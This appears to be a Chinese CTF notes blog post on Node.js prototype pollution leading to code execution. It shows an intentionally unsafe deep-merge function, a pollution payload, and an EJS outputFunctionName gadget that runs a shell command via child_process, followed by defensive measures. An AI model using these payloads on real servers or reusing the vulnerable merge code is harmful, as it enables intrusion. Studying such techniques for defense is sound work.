---
title: "CTF 速记：Node.js 原型链污染到远程代码执行 (RCE) 链挖掘"
date: "2026-03-05"
category: "攻防速记"
tags: ["WebSec", "CTF", "Node.js", "Prototype Pollution", "RCE"]
summary: "梳理 JavaScript 原型链污染的核心原理，记录 lodash.merge 与 ejs / pug 模板引擎结合打出 RCE 的经典 Payload 链条。"
---

在 JavaScript 中，对象的属性查找遵循隐式原型链机制。若服务端对象深度合并（Deep Merge）或克隆操作未对 `__proto__` / `constructor.prototype` 进行严格校验，攻击者可通过输入污染 `Object.prototype`。

## 1. 核心污染原理

```javascript
function deepMerge(target, source) {
  for (let key in source) {
    if (key in target && typeof target[key] === 'object') {
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 攻击载荷
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge({}, payload);

const user = {};
console.log(user.isAdmin); // 输出 true，普通对象均被隐式污染
```

## 2. EJS 模板引擎 Gadget 链

当目标应用使用 EJS 渲染且存在原型链污染时，可通过污染 EJS 编译选项中的 `outputFunctionName` 实现代码执行：

```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag > /tmp/out');s"
  }
}
```

## 3. 防御方案

- 使用 `Object.create(null)` 创建无原型链依赖的字典对象；
- 对输入的 JSON 键名进行递归白名单过滤，显式剔除 `__proto__` 与 `constructor`；
- 在 Node.js 启动时添加 `--disable-proto=delete` 或 `--disable-proto=throw` 运行期保护标志。
